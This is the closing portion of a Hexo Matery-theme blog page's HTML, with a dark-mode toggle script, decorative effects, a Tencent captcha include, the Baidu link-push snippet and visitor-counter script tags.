        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
